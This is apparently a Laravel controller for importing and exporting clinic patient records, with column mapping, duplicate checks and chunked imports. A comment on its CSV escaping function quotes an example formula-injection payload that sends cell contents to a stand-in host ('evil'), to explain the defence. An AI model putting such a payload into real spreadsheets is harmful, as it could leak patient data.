<?php

namespace App\Http\Controllers;

use App\Models\Patient;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Symfony\Component\HttpFoundation\StreamedResponse;

class PatientImportExportController extends Controller
{
    /**
     * Rows per DB transaction during import. One transaction for the whole file
     * held a write lock for the entire run and rolled everything back on a
     * single failure; chunking keeps each lock short and preserves the chunks
     * that already succeeded.
     */
    private const IMPORT_CHUNK_SIZE = 500;

    // ── Column maps per source app ────────────────────────────────────────────
    // Keys   = our Patient field
    // Values = possible column header names from that app (case-insensitive)

    private const COLUMN_MAPS = [
        'clinicia' => [
            // PATIENT_NO in Clinicia export = our patient_id
            'patient_id'      => ['patient_no', 'patient no', 'patient id', 'id', 'uhid', 'mr no', 'mr number'],
            'name'            => ['name', 'patient name', 'full name'],
            'first_name'      => ['first name', 'firstname'],
            'last_name'       => ['last name', 'lastname', 'surname'],
            'phone'           => ['mobile', 'phone', 'mobile no', 'contact no', 'contact number', 'mobile number'],
            // MOBILE2 is Clinicia's second number column
            'alternate_phone' => ['mobile2', 'alternate mobile', 'alternate phone', 'alt mobile', 'alt phone'],
            // EMAIL_ID is the exact header in Clinicia export
            'email'           => ['email_id', 'email', 'email address'],
            // DATE_OF_BIRTH uses underscore in Clinicia export
            'date_of_birth'   => ['date_of_birth', 'date of birth', 'dob', 'birth date', 'birthdate'],
            'gender'          => ['gender', 'sex'],
            'address'         => ['address', 'full address'],
            'area'            => ['area', 'locality'],
            'city'            => ['city', 'town'],
            'state'           => ['state'],
            'pincode'         => ['pincode', 'pin', 'zip', 'zip code'],
            'occupation'      => ['occupation', 'profession'],
            'age_years'       => ['age', 'age (years)', 'age in years'],
            // REMARKS is where Clinicia stores medical history / notes
            'chief_complaint' => ['remarks', 'chief complaint', 'complaint', 'reason', 'notes', 'medical history'],
        ],
        'bestosys' => [
            'patient_id'      => ['patient id', 'patient no', 'id', 'uhid', 'mr no'],
            'name'            => ['name', 'patient name', 'full name'],
            'first_name'      => ['first name', 'firstname', 'first'],
            'last_name'       => ['last name', 'lastname', 'last'],
            'phone'           => ['mobile', 'phone', 'cell', 'contact'],
            // "Second Mobile" is Bestosys's alternate number column
            'alternate_phone' => ['second mobile', 'alternate phone', 'alt phone', 'phone 2', 'mobile 2'],
            // "Email ID (Personal)" is the exact Bestosys header
            'email'           => ['email id (personal)', 'email id (work)', 'email', 'e-mail'],
            'date_of_birth'   => ['date of birth', 'dob', 'birth date'],
            'gender'          => ['gender', 'sex'],
            'address'         => ['address', 'street address'],
            'area'            => ['area', 'locality', 'suburb'],
            'city'            => ['city'],
            'state'           => ['state', 'province'],
            'pincode'         => ['pin', 'pincode', 'postal code', 'zip'],
            'occupation'      => ['occupation'],
            'age_years'       => ['age', 'age (years)', 'age in years'],
            'chief_complaint' => ['notes', 'remarks', 'chief complaint', 'medical history'],
        ],
        'generic' => [
            'patient_id'      => ['patient id', 'patient no', 'id', 'uhid', 'mr no'],
            'name'            => ['name', 'full name', 'patient name'],
            'first_name'      => ['first name', 'firstname', 'first'],
            'last_name'       => ['last name', 'lastname', 'last'],
            'phone'           => ['phone', 'mobile', 'contact'],
            'alternate_phone' => ['alternate phone', 'alt phone', 'phone 2'],
            'email'           => ['email'],
            'date_of_birth'   => ['dob', 'date of birth', 'birth date', 'birthdate'],
            'gender'          => ['gender', 'sex'],
            'address'         => ['address'],
            'area'            => ['area', 'locality'],
            'city'            => ['city'],
            'state'           => ['state'],
            'pincode'         => ['pincode', 'pin', 'postal code', 'zip'],
            'occupation'      => ['occupation'],
            'age_years'       => ['age', 'age (years)', 'age in years'],
            'chief_complaint' => ['notes', 'complaints', 'chief complaint', 'medical history'],
        ],
    ];

    // ── Import form ───────────────────────────────────────────────────────────

    public function importForm()
    {
        return view('patients.import');
    }

    // ── Preview (step 1) — parse file, return first 10 rows ──────────────────

    public function preview(Request $request)
    {
        $request->validate([
            'file'   => ['required', 'file', 'mimes:xlsx,xls,csv', 'max:5120'],
            'source' => ['required', 'in:clinicia,bestosys,generic'],
        ]);

        try {
            // Store file to disk — re-parsed on confirm so session has no row limit
            $tempPath = $request->file('file')->store('imports/temp', 'local');
            $source   = $request->source;
            $rows     = $this->parseFile($request->file('file'), $source);
        } catch (\RuntimeException $e) {
            return redirect()->route('settings.index', ['tab' => 'data'])
                ->withErrors(['file' => $e->getMessage()]);
        }

        if (empty($rows)) {
            return redirect()->route('settings.index', ['tab' => 'data'])
                ->withErrors(['file' => 'No data rows found in the file. Check that the first row has column headers.']);
        }

        // Store only the file path + source in session — no row limit
        $request->session()->put('import_preview', [
            'temp_path' => $tempPath,
            'source'    => $source,
            'total'     => count($rows),
        ]);

        $preview    = array_slice($rows, 0, 10);
        $totalRows  = count($rows);
        $duplicates = $this->countDuplicates($rows);

        return view('patients.import-preview', compact('preview', 'totalRows', 'source', 'duplicates'));
    }

    // ── Import (step 2) — actually save to DB ────────────────────────────────

    public function import(Request $request)
    {
        $request->validate([
            'skip_duplicates' => ['nullable', 'boolean'],
        ]);

        $sessionData = $request->session()->get('import_preview');

        if (!$sessionData || empty($sessionData['temp_path'])) {
            return redirect()->route('settings.index', ['tab' => 'data'])
                ->withErrors(['file' => 'Session expired. Please upload the file again.']);
        }

        // Re-parse directly from the stored temp file — no session row limit
        $fullPath = \Illuminate\Support\Facades\Storage::disk('local')->path($sessionData['temp_path']);
        $rows     = $this->parseFileFromPath($fullPath, pathinfo($fullPath, PATHINFO_EXTENSION), $sessionData['source']);

        $skipDupes = (bool) $request->get('skip_duplicates', true);
        $branchId  = Auth::user()->branch_id;
        $userId    = Auth::id();
        $imported  = 0;
        $skipped   = 0;

        // ── Pre-load the dedup sets ONCE ─────────────────────────────────────
        // Previously every row fired two `exists()` queries against unindexed
        // columns, so a 4,000-row import ran 8,000 full-table scans inside one
        // giant transaction. Two queries up-front replace all of them.
        $existingPhones = Patient::where('branch_id', $branchId)
            ->whereNotNull('phone')->where('phone', '!=', '')
            ->pluck('phone')
            ->flip();

        $existingPatientIds = Patient::where('branch_id', $branchId)
            ->whereNotNull('patient_id')
            ->pluck('patient_id')
            ->flip();

        $seenPatientIds = [];   // source IDs already inserted in THIS file
        $seenPhones     = [];   // phones already inserted in THIS file

        $linker = app(\App\Services\Relationship\PatientRelationshipLinker::class);

        // ── Import in chunks ─────────────────────────────────────────────────
        // One transaction per chunk instead of one for the whole file: a large
        // migration no longer holds a write lock for minutes, and a failure
        // part-way keeps the successfully imported chunks instead of rolling
        // the entire import back.
        foreach (collect($rows)->chunk(self::IMPORT_CHUNK_SIZE) as $chunk) {
            DB::transaction(function () use (
                $chunk, $skipDupes, $branchId, $userId, $linker,
                $existingPhones, $existingPatientIds,
                &$seenPatientIds, &$seenPhones, &$imported, &$skipped
            ) {
                foreach ($chunk as $row) {
                    $phone = $this->sanitizePhone($row['phone'] ?? '');

                    // Duplicate source patient_id — within the file or already in the DB.
                    $rawPatientId = $row['patient_id'] ?? null;
                    if ($rawPatientId) {
                        if (isset($seenPatientIds[$rawPatientId]) || isset($existingPatientIds[$rawPatientId])) {
                            $skipped++;
                            continue;
                        }
                        $seenPatientIds[$rawPatientId] = true;
                    }

                    // Duplicate phone — within the file or already in the DB.
                    if ($phone && $skipDupes
                        && (isset($existingPhones[$phone]) || isset($seenPhones[$phone]))) {
                        $skipped++;
                        continue;
                    }

                    // Build display name
                    if (empty($row['name']) && (!empty($row['first_name']) || !empty($row['last_name']))) {
                        $row['name'] = trim(($row['first_name'] ?? '') . ' ' . ($row['last_name'] ?? ''));
                    }

                    // Skip empty rows
                    if (empty($row['name']) && empty($phone)) {
                        $skipped++;
                        continue;
                    }

                    // Skip summary/footer rows (e.g. Clinicia exports "Count: 4242" as last row)
                    if (preg_match('/^(count|total|sum|grand total)\s*:/i', $row['name'] ?? '')) {
                        $skipped++;
                        continue;
                    }

                    // Only filter out null — keep empty strings so NOT NULL columns don't error
                    $data = array_filter([
                        'patient_id'     => $row['patient_id']        ?? null, // preserve source app ID if present
                        'name'           => $row['name']              ?? null,
                        'first_name'     => $row['first_name']        ?? null,
                        'last_name'      => $row['last_name']         ?? null,
                        'alternate_phone'=> $this->sanitizePhone($row['alternate_phone'] ?? '') ?: null,
                        'email'          => $this->sanitizeEmail($row['email'] ?? '')           ?: null,
                        'date_of_birth'  => $this->sanitizeDate($row['date_of_birth'] ?? ''),
                        'age_years'      => is_numeric($row['age_years'] ?? '') ? (int)$row['age_years'] : null,
                        'gender'         => $this->sanitizeGender($row['gender'] ?? '')         ?: null,
                        'address'        => $row['address']    ?? null,
                        'area'           => $row['area']       ?? null,
                        'city'           => $row['city']       ?? null,
                        'state'          => $row['state']      ?? null,
                        'pincode'        => $row['pincode']    ?? null,
                        'occupation'     => $row['occupation'] ?? null,
                        'chief_complaint'=> $row['chief_complaint'] ?? null,
                    ], fn($v) => $v !== null);

                    // Always include required / non-nullable columns
                    $data['phone']      = $phone ?: '';
                    $data['branch_id']  = $branchId;
                    $data['created_by'] = $userId;

                    $patient = Patient::create($data);

                    // Link to the Master Relationship — exactly as the web "Add
                    // Patient" path does via PatientService. The import used to
                    // call Patient::create() directly and skip this, which is
                    // how bulk-imported patients ended up with no relationship
                    // shell (the orphan rows found in the audit).
                    // Flag-gated + never throws; a no-op when the flag is off.
                    $linker->link($patient);

                    if ($phone) {
                        $seenPhones[$phone] = true;
                    }

                    $imported++;
                }
            });
        }

        // Clean up temp file and session
        \Illuminate\Support\Facades\Storage::disk('local')->delete($sessionData['temp_path']);
        $request->session()->forget('import_preview');

        return redirect()->route('settings.index', ['tab' => 'data'])
            ->with('import_success', "Import complete — {$imported} patients added" . ($skipped ? ", {$skipped} skipped (duplicates)." : '.'));
    }

    // ── Export ────────────────────────────────────────────────────────────────

    public function export(Request $request): StreamedResponse
    {
        // Permission: only admin (or users with export permission)
        if (!Auth::user()->isAdminRole()) {
            abort(403, 'You do not have permission to export patient data.');
        }

        $branchId = Auth::user()->branch_id;

        $patients = Patient::where('branch_id', $branchId)
            ->orderBy('created_at', 'desc')
            ->get([
                'patient_id', 'name', 'first_name', 'last_name', 'gender',
                'date_of_birth', 'phone', 'alternate_phone', 'email',
                'address', 'area', 'city', 'state', 'pincode',
                'occupation', 'chief_complaint', 'source',
                'membership_status', 'last_visit_date', 'created_at',
            ]);

        $filename = 'patients-export-' . now()->format('Y-m-d') . '.csv';

        return response()->streamDownload(function () use ($patients) {
            $handle = fopen('php://output', 'w');

            // CSV header row
            fputcsv($handle, [
                'Patient ID', 'Full Name', 'First Name', 'Last Name', 'Gender',
                'Date of Birth', 'Phone', 'Alternate Phone', 'Email',
                'Address', 'Area', 'City', 'State', 'Pincode',
                'Occupation', 'Chief Complaint', 'Source',
                'Membership Status', 'Last Visit Date', 'Registered On',
            ]);

            foreach ($patients as $p) {
                fputcsv($handle, array_map([$this, 'csvSafe'], [
                    $p->patient_id,
                    $p->name,
                    $p->first_name,
                    $p->last_name,
                    $p->gender,
                    $p->date_of_birth?->format('d/m/Y'),
                    $p->phone,
                    $p->alternate_phone,
                    $p->email,
                    $p->address,
                    $p->area,
                    $p->city,
                    $p->state,
                    $p->pincode,
                    $p->occupation,
                    $p->chief_complaint,
                    $p->source,
                    $p->membership_status,
                    $p->last_visit_date?->format('d/m/Y'),
                    $p->created_at->format('d/m/Y'),
                ]));
            }

            fclose($handle);
        }, $filename, [
            'Content-Type' => 'text/csv',
        ]);
    }

    // ── Download blank template ───────────────────────────────────────────────

    public function downloadTemplate(string $source): StreamedResponse
    {
        $headers = match ($source) {
            // Matches exact Clinicia export column order
            'clinicia' => ['CLINIC', 'NAME', 'MOBILE', 'MOBILE2', 'EMERGENCY_CONTACT', 'EMAIL_ID', 'PATIENT_NO', 'GENDER', 'DATE_OF_BIRTH', 'AGE', 'BLOOD_GROUP', 'ADDRESS', 'REMARKS', 'OUTSTANDING_AMOUNT'],
            // Matches exact Bestosys export column order
            'bestosys' => ['Patient ID', 'Title', 'Name', 'Gender', 'Date of birth', 'Anniversary', 'Mobile', 'Second Mobile', 'Email ID (Personal)', 'Email ID (Work)', 'Religion', 'Race', 'Ethnic Group', 'Group', 'Rate card', 'Insurance ID', 'Membership', 'Membership Expiry', 'Source', 'Source Type', 'Aadhar Card Number', 'Active', 'Created On', 'Created By', 'Last Updated On', 'Last Updated By', 'Notes'],
            default    => ['Name', 'First Name', 'Last Name', 'Phone', 'Alternate Phone', 'Email', 'Date of Birth', 'Gender', 'Address', 'Area', 'City', 'State', 'Pincode', 'Occupation', 'Notes'],
        };

        return response()->streamDownload(function () use ($headers) {
            $handle = fopen('php://output', 'w');
            fputcsv($handle, $headers);
            // Two blank sample rows to show format
            fputcsv($handle, array_fill(0, count($headers), ''));
            fclose($handle);
        }, "import-template-{$source}.csv", ['Content-Type' => 'text/csv']);
    }

    // ── Private helpers ───────────────────────────────────────────────────────

    /**
     * Parse an uploaded file object (from request).
     */
    private function parseFile($uploadedFile, string $source): array
    {
        $extension = strtolower($uploadedFile->getClientOriginalExtension());
        return $this->parseFileFromPath($uploadedFile->getRealPath(), $extension, $source);
    }

    /**
     * Parse from an absolute filesystem path (used after storing temp file).
     */
    private function parseFileFromPath(string $path, string $extension, string $source): array
    {
        $extension = strtolower($extension);

        if (in_array($extension, ['xlsx', 'xls']) && !class_exists('ZipArchive')) {
            throw new \RuntimeException(
                'PHP zip extension is not enabled. Enable ext-zip in php.ini and restart your web server, or upload a CSV file instead.'
            );
        }

        if ($extension === 'csv') {
            $reader = IOFactory::createReader('Csv');
            $reader->setDelimiter(',');
            $spreadsheet = $reader->load($path);
        } else {
            $spreadsheet = IOFactory::load($path);
        }

        $sheet = $spreadsheet->getActiveSheet();
        $data  = $sheet->toArray(null, true, true, false);

        if (empty($data)) return [];

        $rawHeaders = array_map(fn($h) => strtolower(trim((string) $h)), $data[0]);
        $columnMap  = $this->buildColumnMap($rawHeaders, $source);

        $rows = [];
        foreach (array_slice($data, 1) as $row) {
            $mapped = [];
            foreach ($columnMap as $field => $colIndex) {
                $mapped[$field] = trim((string) ($row[$colIndex] ?? ''));
            }
            if (empty(array_filter($mapped))) continue;
            $rows[] = $mapped;
        }

        return $rows;
    }

    /**
     * Map raw header names to our Patient fields using the source column map.
     * Returns [fieldName => columnIndex].
     */
    private function buildColumnMap(array $rawHeaders, string $source): array
    {
        $map       = self::COLUMN_MAPS[$source] ?? self::COLUMN_MAPS['generic'];
        $colMap    = [];

        foreach ($map as $field => $aliases) {
            foreach ($rawHeaders as $idx => $header) {
                if (in_array($header, $aliases, true)) {
                    $colMap[$field] = $idx;
                    break;
                }
            }
        }

        return $colMap;
    }

    private function countDuplicates(array $rows): int
    {
        $branchId   = Auth::user()->branch_id;
        $phones     = array_filter(array_map(fn($r) => $this->sanitizePhone($r['phone'] ?? ''), $rows));
        $patientIds = array_filter(array_map(fn($r) => $r['patient_id'] ?? '', $rows));

        // Count rows that match on either phone OR patient_id
        return Patient::where('branch_id', $branchId)
            ->where(function ($q) use ($phones, $patientIds) {
                if ($phones)     $q->orWhereIn('phone', $phones);
                if ($patientIds) $q->orWhereIn('patient_id', $patientIds);
            })
            ->count();
    }

    /**
     * Neutralise CSV formula injection.
     *
     * A cell beginning with = + - @ (or a leading tab/CR) is executed as a
     * formula when the exported file is opened in Excel/Sheets. A patient whose
     * name is `=HYPERLINK("http://evil/?"&A1,"Click")` would otherwise run on
     * the staff machine that opens the export. Prefixing with an apostrophe
     * forces the cell to be treated as text.
     */
    private function csvSafe(mixed $value): mixed
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        return preg_match('/^[=+\-@\t\r]/', $value) ? "'" . $value : $value;
    }

    private function sanitizePhone(string $v): string
    {
        $v = preg_replace('/[^\d+]/', '', $v);
        // Strip leading country code +91 for Indian numbers
        if (str_starts_with($v, '+91') && strlen($v) === 13) $v = substr($v, 3);
        if (str_starts_with($v, '91')  && strlen($v) === 12) $v = substr($v, 2);
        return strlen($v) >= 7 ? $v : '';
    }

    private function sanitizeEmail(string $v): string
    {
        $v = trim($v);
        return filter_var($v, FILTER_VALIDATE_EMAIL) ? $v : '';
    }

    private function sanitizeDate(string $v): ?string
    {
        if (empty($v)) return null;
        // Try common formats
        foreach (['d/m/Y', 'd-m-Y', 'm/d/Y', 'Y-m-d', 'd.m.Y'] as $fmt) {
            $d = \DateTime::createFromFormat($fmt, $v);
            if ($d && $d->format($fmt) === $v) return $d->format('Y-m-d');
        }
        // Fallback: strtotime
        $ts = strtotime($v);
        return $ts ? date('Y-m-d', $ts) : null;
    }

    private function sanitizeGender(string $v): string
    {
        $v = strtolower(trim($v));
        return match (true) {
            in_array($v, ['male', 'm'])   => 'male',
            in_array($v, ['female', 'f']) => 'female',
            in_array($v, ['other'])       => 'other',
            default                        => '',
        };
    }
}
